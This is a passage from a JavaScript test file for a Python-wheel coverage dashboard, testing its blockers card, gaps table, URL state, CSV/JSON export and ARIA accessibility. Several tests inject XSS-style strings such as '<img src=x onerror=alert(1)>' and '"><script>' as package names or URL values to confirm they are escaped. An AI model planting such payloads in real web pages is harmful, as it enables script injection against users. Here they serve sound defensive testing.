  assert.match(page.get("blockers-feed").innerHTML, /cryptography/);

  page.get("platform-leaderboard").handlers.click(cardClick("musl-aarch64"));
  assert.match(page.get("blockers-feed").innerHTML, /google-crc32c/);
  assert.doesNotMatch(page.get("blockers-feed").innerHTML, /cryptography/);

  page.get("omni-platform-select").handlers.change({ target: { value: "win-arm64" } });
  assert.match(page.get("blockers-feed").innerHTML, /cryptography/);
});

test("the blockers card never renders a hostile name from blockers.json (#93)", async () => {
  const page = await loadPage("");
  const doc = { targets: { "3.14 win-arm64": { checked: 10, blockers: [
    { name: "<img src=x onerror=alert(1)>", count: 3, examples: [] },
    { name: "ok-pkg", count: 2, examples: ["\"><script>", "fine"] },
  ] } } };
  vm.runInContext(`state.blockers = ${JSON.stringify(doc)}; state.python = "3.14"; state.platform = "win-arm64"; renderBlockers();`, page.context);
  const html = page.get("blockers-feed").innerHTML;
  assert.doesNotMatch(html, /<img|<script|onerror/);
  assert.match(html, /ok-pkg/);
  assert.match(html, /e\.g\. <a href="p\/fine\/"/);
});

test("the gaps table's filter, sort and page size come from the shareable URL (#149)", async () => {
  const page = await loadTablePage("#platform=win-arm64&status=missing&sort=downloads&dir=desc&size=all&q=a&compiled=1");
  const i = vm.runInContext("targetIndex(state.python, state.platform)", page.context);
  const rows = vm.runInContext("currentGapsList()", page.context);
  assert.ok(rows.length > 1);
  assert.ok(rows.every((row) => row.results[i] === "missing" && row.name.toLowerCase().includes("a")));
  const counts = Array.from(rows, (row) => row.downloads ?? 0);
  assert.deepEqual(counts, [...counts].sort((a, b) => b - a));
  assert.equal(page.pills.find((p) => p.dataset.filter === "missing").getAttribute("aria-checked"), "true");
  assert.equal(page.pills.find((p) => p.dataset.filter === "all").getAttribute("aria-checked"), "false");
  const downloads = page.headers.find((h) => h.dataset.sort === "downloads");
  assert.equal(downloads.getAttribute("aria-sort"), "descending");
  assert.equal(downloads.icon.textContent, "▼");
  assert.equal(page.headers.find((h) => h.dataset.sort === "rank").getAttribute("aria-sort"), null);
  assert.equal(page.get("page-size-top").value, "all");
  assert.equal(page.get("page-size-bottom").value, "all");
  assert.equal(page.get("gaps-search").value, "a");
  assert.equal(vm.runInContext("state.showCompiledOnly", page.context), true);
  const n = rows.length.toLocaleString("en-US");
  assert.equal(page.get("pagination-info-top").textContent, `Showing 1–${n} of ${n} packages`);
  // Written back as read, in a fixed order, and without the page number.
  vm.runInContext("state.currentPage = 3; writeHash()", page.context);
  const params = new URLSearchParams(page.context.location.hash.slice(1));
  assert.deepEqual([...params.keys()], ["python", "platform", "status", "q", "sort", "dir", "size", "compiled"]);
  assert.equal(params.get("status"), "missing");
  assert.equal(params.get("size"), "all");
});

test("a plain link stays short, and unknown gaps table values in the URL are ignored (#149)", async () => {
  const page = await loadTablePage(`#platform=win-arm64&status=<script>&sort=evil&dir=up&size=7&compiled=yes&page=4&extra=1&q=${"x".repeat(150)}`);
  assert.equal(vm.runInContext("state.filterStatus", page.context), "all");
  assert.equal(vm.runInContext("state.sortCol", page.context), "rank");
  assert.equal(vm.runInContext("state.sortDir", page.context), "asc");
  assert.equal(String(vm.runInContext("state.pageSize", page.context)), "25");
  assert.equal(vm.runInContext("state.showCompiledOnly", page.context), false);
  assert.equal(vm.runInContext("state.currentPage", page.context), 1);
  assert.equal(vm.runInContext("state.filterQuery", page.context).length, 100);
  vm.runInContext("state.filterQuery = ''; writeHash()", page.context);
  const params = new URLSearchParams(page.context.location.hash.slice(1));
  assert.deepEqual([...params.keys()], ["python", "platform"]);
  assert.equal(params.get("platform"), "win-arm64");
});

test("changing the gaps table's status, sort or page size updates the URL (#149)", async () => {
  const page = await loadTablePage("#platform=win-arm64");
  const pill = page.pills.find((p) => p.dataset.filter === "source");
  page.group.handlers.click({ target: pill });
  assert.equal(new URLSearchParams(page.context.location.hash.slice(1)).get("status"), "source");
  const name = page.headers.find((h) => h.dataset.sort === "name");
  const click = { target: { closest: (selector) => selector === "th.sortable" ? name : null } };
  page.head.handlers.click(click);
  page.head.handlers.click(click);
  let params = new URLSearchParams(page.context.location.hash.slice(1));
  assert.equal(params.get("sort"), "name");
  assert.equal(params.get("dir"), "desc");
  page.get("page-size-top").handlers.change({ target: { value: "100" } });
  params = new URLSearchParams(page.context.location.hash.slice(1));
  assert.equal(params.get("size"), "100");
  assert.equal(params.has("page"), false);
});

// ---------------------------------------------------------------------------------------------------------------
// The gaps table: filters, sort, paging and the CSV/JSON export (#148), on the committed data/coverage.json.
// ---------------------------------------------------------------------------------------------------------------
const run = (page, code) => vm.runInContext(code, page.context);
const gapRows = (page) => (page.get("gaps").innerHTML.match(/<tr class="gap-row/g) ?? []).length;
const pageClick = (n) => ({ target: { closest: (sel) => (sel === "button.page-btn" ? { disabled: false, dataset: { page: String(n) } } : null) } });
const pageLabels = (html) => Array.from(html.matchAll(/data-page="(\d+)" aria-current="[^"]*">(\d+)<\/button>|<span class="page-ellipsis">…<\/span>/g),
  (m) => (m[2] ?? "…"));

test("the status pills keep only the selected target's source or missing results (#148)", async () => {
  const page = await loadTablePage();
  const all = run(page, "currentGapsList().length");
  let shown = 0;
  for (const [index, status] of [[1, "source"], [2, "missing"]]) {
    page.group.handlers.click({ target: page.pills[index] });
    const statuses = run(page, "(() => { const i = targetIndex(state.python, state.platform); return currentGapsList().map((p) => p.results[i]); })()");
    assert.ok(statuses.length > 0, status);
    assert.ok(statuses.every((s) => s === status), status);
    shown += statuses.length;
  }
  assert.ok(shown <= all);
  page.group.handlers.click({ target: page.pills[0] });
  assert.equal(run(page, "currentGapsList().length"), all);
});

test("the name filter ignores case, goes back to page 1, and escapes what was typed (#148)", async () => {
  const page = await loadTablePage();
  const name = run(page, "currentGapsList()[0].name");
  const typed = name.slice(0, 4).toUpperCase();
  run(page, "state.currentPage = 2");
  page.get("gaps-search").handlers.input({ target: { value: `  ${typed} ` } });
  assert.equal(run(page, "state.currentPage"), 1);
  const names = run(page, "currentGapsList().map((p) => p.name)");
  assert.ok(names.includes(name));
  assert.ok(names.every((n) => n.toLowerCase().includes(typed.toLowerCase())));

  page.get("gaps-search").handlers.input({ target: { value: "<b>" } });
  const html = page.get("gaps").innerHTML;
  assert.match(html, /No matching gap packages for "&lt;b&gt;"\./);
  assert.doesNotMatch(html, /<b>/);
});

test("each sort heading orders by its column and a second click reverses it (#148)", async () => {
  const page = await loadTablePage();
  const keys = {
    rank: "p.rank",
    name: "p.name",
    status: "p.results[i] ?? ''",
    downloads: "p.downloads ?? 0",
  };
  for (const header of page.headers) {
    const col = header.dataset.sort;
    const click = { target: { closest: (selector) => selector === "th.sortable" ? header : null } };
    const directions = [];
    for (let n = 0; n < 2; n++) {
      page.head.handlers.click(click);
      assert.equal(run(page, "state.sortCol"), col);
      const dir = run(page, "state.sortDir");
      directions.push(dir);
      const values = run(page, `(() => { const i = targetIndex(state.python, state.platform); return currentGapsList().map((p) => ${keys[col]}); })()`);
      assert.ok(values.length > 1);
      for (let k = 1; k < values.length; k++) {
        const a = values[k - 1], b = values[k];
        const cmp = typeof a === "number" ? a - b : a.localeCompare(b);
        assert.ok(dir === "asc" ? cmp <= 0 : cmp >= 0, `${col} ${dir}: ${a} before ${b}`);
      }
      assert.equal(header.getAttribute("aria-sort"), dir === "asc" ? "ascending" : "descending");
    }
    assert.notEqual(directions[0], directions[1], col);
  }
});

test("page sizes 25, 100 and all show the right rows and range text (#148)", async () => {
  const page = await loadTablePage();
  const total = run(page, "currentGapsList().length");
  assert.ok(total > 100, "the default target has more than 100 gaps");
  const fmt = (n) => run(page, `fmt(${n})`);
  for (const size of ["25", "100", "all"]) {
    run(page, "state.currentPage = 3");
    page.get("page-size-top").handlers.change({ target: { value: size } });
    assert.equal(run(page, "state.currentPage"), 1);
    const shown = size === "all" ? total : Number(size);
    assert.equal(gapRows(page), shown, size);
    assert.equal(page.get("pagination-info-top").textContent, `Showing ${fmt(1)}–${fmt(shown)} of ${fmt(total)} packages`);
    assert.equal(page.get("pagination-info-bottom").textContent, page.get("pagination-info-top").textContent);
    assert.equal(page.get("page-size-bottom").value, size);
    if (size === "all") assert.equal(page.get("pagination-buttons-top").innerHTML, "");
  }
});

test("page 5 of many shows 1 … 4 5 6 … N, and a filter change goes back to page 1 (#148)", async () => {
  const page = await loadTablePage();
  run(page, "state.pageSize = '10'; renderGaps()");
  const pages = Math.ceil(run(page, "currentGapsList().length") / 10);
  assert.ok(pages >= 9, "enough pages for both ellipses");
  page.get("pagination-buttons-top").handlers.click(pageClick(5));
  assert.equal(run(page, "state.currentPage"), 5);
  assert.deepEqual(pageLabels(page.get("pagination-buttons-top").innerHTML), ["1", "…", "4", "5", "6", "…", String(pages)]);
  assert.match(page.get("pagination-buttons-top").innerHTML, /data-page="5" aria-current="page">5</);
  const first = run(page, "currentGapsList()[40].name");
  assert.match(page.get("gaps").innerHTML, new RegExp(`data-pkg="${first.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}"`));

  page.group.handlers.click({ target: page.pills[1] });
  assert.equal(run(page, "state.currentPage"), 1);
  assert.deepEqual(pageLabels(page.get("pagination-buttons-top").innerHTML).slice(0, 2), ["1", "2"]);
});

test("the CSV and JSON exports quote names and match the filtered table (#148)", async () => {
  const downloads = [];
  const page = await loadTablePage();
  page.context.document.createElement = () => {
    const a = { href: "", download: "", click() { downloads.push({ href: a.href, download: a.download }); } };
    return a;
  };
  run(page, `(() => {
    const i = targetIndex(state.python, state.platform);
    const gap = gapsAt(state.data.packages, i).find((p) => p.results[i] === "missing");
    gap.name = 'say "hi"';
    gap.version = undefined;
  })()`);
  page.group.handlers.click({ target: page.pills[2] });
  const expected = run(page, "currentGapsList().map((p) => p.name)");
  const target = run(page, "[state.python, state.platform]");

  run(page, "exportCSV(); exportJSON()");
  assert.equal(downloads.length, 2);
  const [csv, json] = downloads;
  assert.equal(csv.download, `wheelgap-${target[1]}-py${target[0]}-gaps.csv`);
  assert.equal(json.download, `wheelgap-${target[1]}-py${target[0]}-gaps.json`);

  const csvText = decodeURIComponent(csv.href.replace(/^data:text\/csv;charset=utf-8,/, ""));
  const lines = csvText.split("\n");
  assert.equal(lines[0], "Rank,Package,Version,Status,Downloads,Platform,Python");
  assert.equal(lines.length - 1, expected.length);
  assert.ok(lines.slice(1).every((line) => line.includes(",missing,")));
  assert.ok(lines.some((line) => /^\d+,"say ""hi""","",missing,\d+,/.test(line)), "a quote in the name is doubled");

  const doc = JSON.parse(decodeURIComponent(json.href.replace(/^data:application\/json;charset=utf-8,/, "")));
  assert.equal(doc.count, expected.length);
  assert.deepEqual(doc.packages.map((p) => p.name), expected);
  assert.deepEqual(doc.target, { python: target[0], platform: target[1] });
  assert.ok(doc.packages.every((p) => p.status === "missing"));
});

test("both exports write unknown for a package with no result on the target (#148)", async () => {
  const downloads = [];
  const page = await loadTablePage();
  page.context.document.createElement = () => {
    const a = { href: "", download: "", click() { downloads.push(a.href); } };
    return a;
  };
  run(page, `(() => {
    const i = targetIndex(state.python, state.platform);
    const gap = gapsAt(state.data.packages, i)[0];
    gap.name = "no-result-here";
    gap.results = gap.results.slice(0, i);
  })()`);
  page.get("gaps-search").handlers.input({ target: { value: "no-result-here" } });
  run(page, "exportCSV(); exportJSON()");
  const csvLines = decodeURIComponent(downloads[0].replace(/^data:[^,]*,/, "")).split("\n");
  const doc = JSON.parse(decodeURIComponent(downloads[1].replace(/^data:[^,]*,/, "")));
  assert.equal(csvLines.length, 2);
  assert.equal(csvLines[1].split(",")[3], "unknown");
  assert.equal(doc.packages[0].status, "unknown");
});

// The Python selector is a radio group that keeps focus across a switch (#163).
async function loadTabsPage() {
  return loadPage("", null, null, (context, get) => {
    const tabs = get("python-tabs");
    // Stand-in for the buttons renderTabs() writes: querySelector finds the checked one in the current markup.
    tabs.querySelector = (selector) => {
      assert.equal(selector, 'button[aria-checked="true"]');
      const m = tabs.innerHTML.match(/<button[^>]*aria-checked="true"[^>]*data-python="([^"]+)"/);
      return m ? { python: m[1], focus() { context.document.activeElement = this; } } : null;
    };
  });
}
const tabButton = (py) => ({ closest: (sel) => (sel === "button[data-python]" ? { dataset: { python: py } } : null) });
const checkedPython = (html) => html.match(/aria-checked="true"[^>]*data-python="([^"]+)"/)[1];

test("python selector is a radio group with one tab stop (#163)", async () => {
  const html = fs.readFileSync(path.join(ROOT, "site", "index.html"), "utf8");
  assert.match(html, /<div class="tabs" role="radiogroup" aria-label="Python version" id="python-tabs">/);
  const { get, context } = await loadTabsPage();
  const markup = get("python-tabs").innerHTML;
  const buttons = markup.match(/<button[^>]*>/g);
  assert.equal(buttons.length, context.pythons().length);
  assert.ok(buttons.every((b) => /type="button" role="radio"/.test(b)));
  assert.doesNotMatch(markup, /role="tab"|aria-selected/);
  assert.equal(buttons.filter((b) => /aria-checked="true"/.test(b)).length, 1);
  assert.equal(buttons.filter((b) => /tabindex="0"/.test(b)).length, 1);
  assert.match(markup, /aria-checked="true" tabindex="0"/);
  assert.equal(context.document.activeElement, undefined, "first load doesn't move focus");
});

test("arrow keys, Home and End move the Python choice and keep focus on it (#163)", async () => {
  const { get, context } = await loadTabsPage();
  const list = context.pythons();
  assert.ok(list.length > 2);
  const tabs = get("python-tabs");
  const press = (key, extra = {}) => {
    let prevented = false;
    tabs.handlers.keydown({ key, target: tabButton(checkedPython(tabs.innerHTML)), preventDefault() { prevented = true; }, ...extra });
    return prevented;
  };
  assert.equal(checkedPython(tabs.innerHTML), list[0]);
  assert.ok(press("ArrowRight"));
  assert.equal(checkedPython(tabs.innerHTML), list[1]);
  assert.equal(context.document.activeElement.python, list[1], "focus is on the newly selected button");
  press("ArrowLeft");
  press("ArrowLeft"); // from the first, wraps to the last
  assert.equal(checkedPython(tabs.innerHTML), list.at(-1));
  assert.equal(context.document.activeElement.python, list.at(-1));
  press("ArrowDown"); // and from the last back to the first
  assert.equal(checkedPython(tabs.innerHTML), list[0]);
  press("End");
  assert.equal(checkedPython(tabs.innerHTML), list.at(-1));
  press("Home");
  assert.equal(checkedPython(tabs.innerHTML), list[0]);
  assert.equal(context.document.activeElement.python, list[0]);
  // Alt/Ctrl/Meta combinations and other keys are left alone.
  assert.equal(press("ArrowRight", { altKey: true }), false);
  assert.equal(press("a"), false);
  assert.equal(checkedPython(tabs.innerHTML), list[0]);
});

test("clicking a Python (or Enter/Space on it) re-renders for it and keeps focus on it (#163)", async () => {
  const { get, context } = await loadTabsPage();
  const list = context.pythons();
  const tabs = get("python-tabs");
  tabs.handlers.click({ target: tabButton(list[2]) });
  assert.equal(checkedPython(tabs.innerHTML), list[2]);
  assert.equal(context.document.activeElement.python, list[2]);
  assert.match(context.location.hash, new RegExp(`python=${list[2].replace(".", "\\.")}`));
});

// Both package searches are WAI-ARIA comboboxes (#167). The stub DOM here records attributes and classes, so the
// tests can follow aria-expanded, aria-activedescendant and each option's aria-selected.
async function loadComboboxPage() {
  return loadPage("", null, null, (context) => {
    context.document.handlers = {};
    context.document.addEventListener = (type, fn) => { (context.document.handlers[type] ??= []).push(fn); };
    const byId = context.document.getElementById;
    context.document.getElementById = (id) => {
      const node = byId(id);
      if (!node.attrs) {
        node.focus = () => { context.document.activeElement = node; };
        node.attrs = {};
        node.classes = new Set();
        node.setAttribute = (k, v) => { node.attrs[k] = String(v); };
        node.getAttribute = (k) => node.attrs[k] ?? null;
        node.removeAttribute = (k) => { delete node.attrs[k]; };
        node.classList = {
          add: (c) => node.classes.add(c), remove: (c) => node.classes.delete(c),
          toggle: (c, on) => (on ?? !node.classes.has(c)) ? node.classes.add(c) : node.classes.delete(c),
          contains: (c) => node.classes.has(c),
        };
      }
      return node;
    };
  });
}
const optionIds = (html) => [...html.matchAll(/id="([a-z]+-opt-\d+)"[^>]*role="option"/g)].map((m) => m[1]);
const optionNames = (html, attr) => [...html.matchAll(new RegExp(`${attr}="([^"]+)"`, "g"))].map((m) => m[1]);
const selectedOptions = (get, ids) => ids.filter((id) => get(id).attrs?.["aria-selected"] === "true");
const typeInto = (get, id, value) => { get(id).value = value; get(id).handlers.input({ target: get(id) }); };
const keyOn = (get, id, key) => {
  let prevented = false;
  get(id).handlers.keydown({ key, target: get(id), preventDefault() { prevented = true; } });
  return prevented;
};
const settle = () => new Promise((r) => setTimeout(r, 600)); // past the live region's pause

test("both search inputs and lists carry the combobox roles (#167)", () => {
  const html = fs.readFileSync(path.join(ROOT, "site", "index.html"), "utf8");
  assert.match(html, /<input id="search"[^>]* role="combobox" aria-autocomplete="list" aria-controls="search-autocomplete" aria-expanded="false">/);
  assert.match(html, /id="search-autocomplete" role="listbox" aria-label="[^"]+"/);
  assert.match(html, /<input class="cmd-input" id="cmd-input"[^>]* role="combobox" aria-label="[^"]+" aria-autocomplete="list" aria-controls="cmd-results" aria-expanded="false">/);
  assert.match(html, /id="cmd-results" role="listbox" aria-label="[^"]+"/);
  for (const id of ["search-status", "cmd-status"]) assert.match(html, new RegExp(`class="visually-hidden" id="${id}" role="status" aria-live="polite"`));
  // The quick search's region sits inside the modal dialog, where a screen reader still hears it.
  const at = (needle) => html.indexOf(needle);
  assert.ok(at('id="cmd-overlay"') < at('id="cmd-status"') && at('id="cmd-status"') < at('class="cmd-footer"'), "cmd-status is inside the dialog");
});

test("lookup: Down and Up move aria-activedescendant while focus stays in the input, Enter picks it (#167)", async () => {
  const { get, context } = await loadComboboxPage();
  get("search").focus();
  typeInto(get, "search", "num");
  const menu = get("search-autocomplete");
  assert.equal(menu.hidden, false);
  assert.equal(get("search").attrs["aria-expanded"], "true");
  const ids = optionIds(menu.innerHTML);
  assert.ok(ids.length >= 2, "several suggestions");
  assert.deepEqual(ids, ids.map((_, k) => `search-opt-${k}`), "ids come from the index");
  assert.doesNotMatch(menu.innerHTML, /role="button"|tabindex/);
  assert.doesNotMatch(menu.innerHTML, /aria-selected="true"/, "no option is rendered selected");
  assert.equal(get("search").attrs["aria-activedescendant"], undefined, "nothing is highlighted until Up or Down");
  assert.ok(keyOn(get, "search", "ArrowDown"));
  assert.equal(get("search").attrs["aria-activedescendant"], "search-opt-0");
  assert.deepEqual(selectedOptions(get, ids), ["search-opt-0"]);
  keyOn(get, "search", "ArrowDown");
  assert.equal(get("search").attrs["aria-activedescendant"], "search-opt-1");
  assert.deepEqual(selectedOptions(get, ids), ["search-opt-1"]);
  assert.ok(get("search-opt-1").classes.has("selected") && !get("search-opt-0").classes.has("selected"), "the look follows");
  keyOn(get, "search", "ArrowUp");
  keyOn(get, "search", "ArrowUp"); // from the first, wraps to the last
  assert.equal(get("search").attrs["aria-activedescendant"], ids.at(-1));
  keyOn(get, "search", "ArrowDown"); // and back round to the first
  keyOn(get, "search", "ArrowDown");
  assert.equal(context.document.activeElement, get("search"), "focus never left the input");
  const names = optionNames(menu.innerHTML, "data-name");
  assert.ok(keyOn(get, "search", "Enter"), "Enter on a highlighted option is the option's, not the form's");
  assert.equal(get("search").value, names[1]);
  assert.equal(menu.hidden, true);
  assert.equal(get("search").attrs["aria-expanded"], "false");
  assert.equal(get("search").attrs["aria-activedescendant"], undefined);
  assert.match(context.location.hash, new RegExp(`package=${names[1]}`));
});

test("lookup: Enter with nothing highlighted submits the form as before (#167)", async () => {
  const { get } = await loadComboboxPage();
  typeInto(get, "search", "num");
  assert.equal(keyOn(get, "search", "Enter"), false, "the form's submit handles it");
  assert.equal(get("search").value, "num");
});

test("lookup: Escape closes the list and sets aria-expanded to false (#167)", async () => {
  const { get } = await loadComboboxPage();
  typeInto(get, "search", "num");
  keyOn(get, "search", "ArrowDown");
  keyOn(get, "search", "Escape");
  assert.equal(get("search-autocomplete").hidden, true);
  assert.equal(get("search").attrs["aria-expanded"], "false");
  assert.equal(get("search").attrs["aria-activedescendant"], undefined);
  assert.equal(get("search").value, "num", "Escape keeps what was typed");
  // Down reopens it.
  keyOn(get, "search", "ArrowDown");
  assert.equal(get("search-autocomplete").hidden, false);
  assert.equal(get("search").attrs["aria-activedescendant"], "search-opt-0");
});

test("quick search: Down moves aria-activedescendant and aria-selected, Enter opens the highlighted package (#167)", async () => {
  const { get } = await loadComboboxPage();
  get("cmd-trigger").handlers.click();
  assert.equal(get("cmd-input").attrs["aria-expanded"], "true");
  assert.equal(get("cmd-input").attrs["aria-activedescendant"], "cmd-opt-0", "the first result starts highlighted, as before");
  typeInto(get, "cmd-input", "num");
  const ids = optionIds(get("cmd-results").innerHTML);
  assert.ok(ids.length >= 2);
  assert.match(get("cmd-results").innerHTML, /id="cmd-opt-0" data-pkg="[^"]+" role="option" aria-selected="true"/);
  assert.equal((get("cmd-results").innerHTML.match(/aria-selected="true"/g) ?? []).length, 1);
  keyOn(get, "cmd-input", "ArrowDown");
  assert.equal(get("cmd-input").attrs["aria-activedescendant"], "cmd-opt-1");
  assert.deepEqual(selectedOptions(get, ids), ["cmd-opt-1"]);
  keyOn(get, "cmd-input", "ArrowUp");
  keyOn(get, "cmd-input", "ArrowUp");
  assert.equal(get("cmd-input").attrs["aria-activedescendant"], ids.at(-1));
  const names = optionNames(get("cmd-results").innerHTML, "data-pkg");
  keyOn(get, "cmd-input", "Enter");
  assert.equal(get("cmd-overlay").hidden, true);
  assert.equal(get("drawer-title").textContent, names.at(-1));
  typeInto(get, "cmd-input", "no-such-package-zzz");
  assert.equal(get("cmd-input").attrs["aria-expanded"], "false");
  assert.equal(get("cmd-input").attrs["aria-activedescendant"], undefined);
});

test("the live regions give the count once typing pauses, and say when nothing matches (#167)", async () => {
  const { get } = await loadComboboxPage();
  const said = [];
  Object.defineProperty(get("search-status"), "textContent", { get: () => said.at(-1) ?? "", set: (v) => said.push(v) });
  for (const v of ["n", "nu", "num"]) typeInto(get, "search", v);
  assert.equal(get("search-status").textContent, "", "nothing is announced while typing");
  await settle();
  const count = optionIds(get("search-autocomplete").innerHTML).length;
  assert.deepEqual(said, ["", `${count} suggestions. Use Up and Down to choose.`], "one announcement, for what was typed last, after clearing the region");
  typeInto(get, "search", "no-such-package-zzz");
  await settle();
  assert.equal(get("search-status").textContent, "No packages match.");
  assert.equal(get("search-autocomplete").hidden, true);

  get("cmd-trigger").handlers.click();
  typeInto(get, "cmd-input", "no-such-package-zzz");
  await settle();
  assert.equal(get("cmd-status").textContent, "No packages match.");
  typeInto(get, "cmd-input", "num");
  await settle();
  assert.match(get("cmd-status").textContent, /^\d+ suggestions?\. Use Up and Down to choose\.$/);
});

test("lookup: the global Escape and a click outside also reset the combobox state (#167)", async () => {
  const { get, context } = await loadComboboxPage();
  for (const id of ["cmd-overlay", "drawer", "export-backdrop"]) get(id).hidden = true; // only the lookup is open
  for (const close of ["Escape", "click outside"]) {
    typeInto(get, "search", "num");
    keyOn(get, "search", "ArrowDown");
    assert.equal(get("search").attrs["aria-activedescendant"], "search-opt-0");
    // The page's global Escape handler, and its click-outside handler (the last document click listener).
    if (close === "Escape") context.document.handlers.keydown.at(-1)({ key: "Escape", preventDefault() {} });
    else context.document.handlers.click.at(-1)({ target: { closest: () => null } });
    assert.equal(get("search-autocomplete").hidden, true, close);
    assert.equal(get("search").attrs["aria-expanded"], "false", close);
    assert.equal(get("search").attrs["aria-activedescendant"], undefined, close);
  }
});

test("lookup: no count is announced once the list has closed within the pause (#167)", async () => {
  const { get } = await loadComboboxPage();
  const said = [];
  Object.defineProperty(get("search-status"), "textContent", { get: () => said.at(-1) ?? "", set: (v) => said.push(v) });
  typeInto(get, "search", "num");
  keyOn(get, "search", "ArrowDown");
  keyOn(get, "search", "Enter"); // picks a suggestion and closes the list before the pause ends
  await settle();
  assert.deepEqual(said, [], "the count would talk over the lookup result");
});

test("lookup: a pending \"No packages match.\" is dropped once the field is cleared or submitted (#167)", async () => {
  const { get } = await loadComboboxPage();
  const said = [];
  Object.defineProperty(get("search-status"), "textContent", { get: () => said.at(-1) ?? "", set: (v) => said.push(v) });
  typeInto(get, "search", "no-such-package-zzz");
  typeInto(get, "search", ""); // backspaced to empty within the pause
  await settle();
  typeInto(get, "search", "no-such-package-zzz");
  get("search-form").handlers.submit({ preventDefault() {} }); // Enter within the pause
  await settle();
  assert.deepEqual(said, [], "it would talk over an empty field or the lookup result");
});

test("the same count twice is announced again: the region is cleared before each write", async () => {
  const { get } = await loadComboboxPage();
  const said = [];
  Object.defineProperty(get("search-status"), "textContent", { get: () => said.at(-1) ?? "", set: (v) => said.push(v) });
  typeInto(get, "search", "n");
  await settle();
  typeInto(get, "search", "nu");
  await settle();
  const text = said.at(-1);
  assert.match(text, /^8 suggestions\./, "both short queries hit the cap");
  assert.deepEqual(said, ["", text, "", text]);
});

test("lookup: clicking a suggestion picks it and closes the list", async () => {
  const { get, context } = await loadComboboxPage();
  typeInto(get, "search", "num");
  const names = optionNames(get("search-autocomplete").innerHTML, "data-name");
  get("search-autocomplete").handlers.click({ target: { closest: (sel) => (sel === ".autocomplete-item" ? { dataset: { name: names[2] } } : null) } });
  assert.equal(get("search").value, names[2]);
  assert.equal(get("search-autocomplete").hidden, true);
  assert.equal(get("search").attrs["aria-expanded"], "false");
  assert.equal(get("search").attrs["aria-activedescendant"], undefined);
  assert.match(context.location.hash, new RegExp(`package=${names[2]}`));
  // A click outside an option does nothing.
  get("search-autocomplete").handlers.click({ target: { closest: () => null } });
  assert.equal(get("search").value, names[2]);
});

test("modified arrows stay the input's, Tab closes the lookup list, and a press on the list keeps focus (#167)", async () => {
  const { get } = await loadComboboxPage();
  const press = (id, key, mods = {}) => {
    let prevented = false;
    get(id).handlers.keydown({ key, target: get(id), ...mods, preventDefault() { prevented = true; } });
    return prevented;
  };
  const MODS = ["shiftKey", "altKey", "ctrlKey", "metaKey"];
  typeInto(get, "search", "num");
  for (const mod of MODS) {
    for (const key of ["ArrowDown", "ArrowUp"]) {
      assert.equal(press("search", key, { [mod]: true }), false, `${mod}+${key} is left to the input (Shift extends the selection)`);
      assert.equal(get("search").attrs["aria-activedescendant"], undefined, `${mod}+${key} highlights nothing`);
    }
  }
  keyOn(get, "search", "ArrowDown");
  assert.equal(get("search").attrs["aria-activedescendant"], "search-opt-0");
  assert.equal(press("search", "Tab"), false, "Tab still moves focus on");
  assert.equal(get("search-autocomplete").hidden, true, "the list doesn't stay open behind it");
  assert.equal(get("search").attrs["aria-expanded"], "false");
  assert.equal(get("search").attrs["aria-activedescendant"], undefined);
  let kept = false;
  get("search-autocomplete").handlers.mousedown({ preventDefault() { kept = true; } });
  assert.ok(kept, "pressing an option doesn't take focus off the input");

  get("cmd-trigger").handlers.click();
  typeInto(get, "cmd-input", "num");
  for (const mod of MODS) {
    assert.equal(press("cmd-input", "ArrowDown", { [mod]: true }), false, `${mod}+ArrowDown is left to the input`);
    assert.equal(get("cmd-input").attrs["aria-activedescendant"], "cmd-opt-0", `${mod}+ArrowDown moves nothing`);
  }
  keyOn(get, "cmd-input", "ArrowDown");
  assert.equal(get("cmd-input").attrs["aria-activedescendant"], "cmd-opt-1");
});

// ---------------------------------------------------------------------------------------------------------------
// Buttons whose content is only a symbol get their name from words (#178).
// ---------------------------------------------------------------------------------------------------------------
const buttonNames = (html) => Array.from(html.matchAll(/<button\b[^>]*\baria-label="([^"]*)"[^>]*>(.*?)<\/button>/gs), (m) => m[1]);

test("pagination buttons are named in words in both pagers, and keep their names after a page change (#178)", async () => {
  const page = await loadTablePage();
  run(page, "state.pageSize = '10'; renderGaps()");
  const pages = Math.ceil(run(page, "currentGapsList().length") / 10);
  assert.ok(pages >= 9, "enough pages for both ellipses");
  for (const current of [1, 5]) {
    if (current !== 1) page.get("pagination-buttons-top").handlers.click(pageClick(current));
    const html = page.get("pagination-buttons-top").innerHTML;
    assert.equal(page.get("pagination-buttons-bottom").innerHTML, html);
    const middle = current === 1 ? [1, 2, 3, 4, 5, pages] : [1, 4, 5, 6, pages];
    assert.deepEqual(buttonNames(html), ["First page", "Previous page", ...middle.map((n) => `Page ${n}`), "Next page", "Last page"]);
    assert.equal((html.match(/<button\b/g) ?? []).length, buttonNames(html).length, "no button without a name");
    for (const glyph of ["⏮", "◀", "▶", "⏭"]) assert.ok(html.includes(`<span aria-hidden="true">${glyph}</span>`), `${glyph} is hidden`);
    assert.match(html, new RegExp(`aria-label="Page ${current}" data-page="${current}" aria-current="page"`));
  }
});

test("each row's details button names its package and says whether its details are open (#178)", async () => {
  const clicks = []; // the rows' buttons are handled by a click listener on the document
  const page = await loadPage("", null, null, (context) => {
    context.document.addEventListener = (type, fn) => { if (type === "click") clicks.push(fn); };
  });
  const click = async (event) => { for (const fn of clicks) await fn(event); };
  const [first, second] = run(page, "currentGapsList().slice(0, 2).map((p) => p.name)");
  const button = (name) => page.get("gaps").innerHTML.match(new RegExp(`<button type="button" class="row-expand-btn" data-pkg="${name}"[^>]*>.*?</button>`, "s"))[0];
  const expandClick = (name) => ({ preventDefault() {}, target: { closest: (sel) => (sel === ".row-expand-btn" ? { dataset: { pkg: name } } : null) } });
  for (const name of [first, second]) {
    assert.match(button(name), new RegExp(`aria-label="Details for ${name}" aria-expanded="false"><span aria-hidden="true">▼</span></button>$`));
  }
  await click(expandClick(first));
  assert.match(button(first), /aria-expanded="true"><span aria-hidden="true">▲<\/span>/);
  assert.match(button(second), /aria-expanded="false"/);
  await click(expandClick(first));
  assert.match(button(first), /aria-expanded="false"/);
  assert.doesNotMatch(page.get("gaps").innerHTML, /Toggle details/);
});

test("a hostile package name is escaped in its details button's name (#178)", async () => {
  const page = await loadTablePage();
  run(page, `currentGapsList()[0].name = '"><img src=x>'; renderGaps()`);
  assert.ok(page.get("gaps").innerHTML.includes('aria-label="Details for &quot;&gt;&lt;img src=x&gt;"'));
});

for (const [startsDark, how] of [[false, "the stored light theme"], [true, "the stored dark theme"], [true, "the system's dark preference"]]) {
  test(`the theme toggle's aria-pressed follows ${how}, on load and after each click (#178)`, async () => {
    let theme = null;
